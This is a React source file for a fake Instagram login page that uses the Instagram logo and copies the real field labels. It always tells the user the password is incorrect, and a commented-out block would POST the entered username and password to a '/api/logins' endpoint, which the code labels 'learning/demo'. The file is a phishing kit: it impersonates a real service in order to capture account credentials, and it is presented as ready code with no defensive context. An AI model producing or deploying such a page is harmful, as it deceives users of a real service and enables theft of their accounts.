import { useState } from "react";

export default function LoginPage() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [msg, setMsg] = useState("");

  function handleSubmit(e) {
    e.preventDefault();

    if (!username || !password) {
      setMsg("Please enter username and password.");
      return;
    }

    setMsg("Sorry, your username or password is incorrect. Please try again.");

    // Optionally, send data to backend for learning/demo
    /*
    fetch("/api/logins", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ username, password }),
    }).catch(() => {});
    */
  }

  return (
    <div className="container">
      <img
        src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png"
        alt="Instagram"
        style={{ display: "block", margin: "30px auto", maxWidth: 180 }}
      />
      <form onSubmit={handleSubmit}>
        <label htmlFor="username">Phone number, username, or email</label>
        <input
          id="username"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          placeholder="Phone number, username, or email"
          autoComplete="off"
          spellCheck="false"
        />
        <label htmlFor="password">Password</label>
        <input
          id="password"
          type="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          placeholder="Password"
          autoComplete="off"
          spellCheck="false"
        />
        <button type="submit">Log In</button>
      </form>
      {msg && <div className="message">{msg}</div>}
      <div style={{ marginTop: 30, textAlign: "center", color: "#999" }}>
        <a href="#">Forgot password?</a>
      </div>
    </div>
  );
}